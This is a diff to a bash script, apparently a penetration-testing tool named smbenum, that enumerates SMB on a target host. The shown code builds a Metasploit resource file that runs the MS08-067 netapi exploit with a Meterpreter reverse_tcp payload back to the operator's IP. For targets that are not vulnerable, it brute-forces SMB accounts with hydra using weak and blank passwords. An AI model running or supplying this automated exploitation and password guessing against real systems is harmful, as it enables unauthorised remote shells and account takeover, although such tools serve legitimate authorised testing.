@@ -1,7 +1,9 @@
 #!/bin/bash
-# smbcheck- This script will enumerate SMB using every tool in the arsenal
+# smbenum 0.2 - This script will enumerate SMB using every tool in the arsenal
 # SECFORCE - Antonio Quina
 # All credits to Bernardo Damele A. G. <bernardo.damele@gmail.com> for the ms08-067_check.py script
+
+IFACE="eth0"
 
 if [ $# -eq 0 ]
 	then
@@ -55,7 +57,7 @@ echo $vulnerable
 if [[ $vulnerable == *"VULNERABLE"* ]]
 	then
 		echo "Oh yeah! The target is vulnerable!"
-		MYIP=$(ifconfig | grep -Po '.*inet addr:\K[0-9.]*' | head -n1)
+		MYIP=$(ifconfig $IFACE | awk -F'[: ]+' '/inet addr:/ {print $4}')
 		echo "use exploits/windows/smb/ms08_067_netapi" > /tmp/$IP-netapi.rc
 		echo "set payload windows/meterpreter/reverse_tcp" >> /tmp/$IP-netapi.rc
 		echo "set RHOST $IP" >> /tmp/$IP-netapi.rc
@@ -69,7 +71,6 @@ if [[ $vulnerable == *"VULNERABLE"* ]]
 	else
 		echo "The target is NOT vulnerable!"
 		echo -e "\n########## Bruteforcing all users with 'password', blank and username as password"
-		#hydra -e ns -L /tmp/$IP-users.txt -p password -V $IP smb -t 1
 		hydra -e ns -L /tmp/$IP-users.txt -p password $IP smb -t 1
 		rm /tmp/$IP-users.txt
 
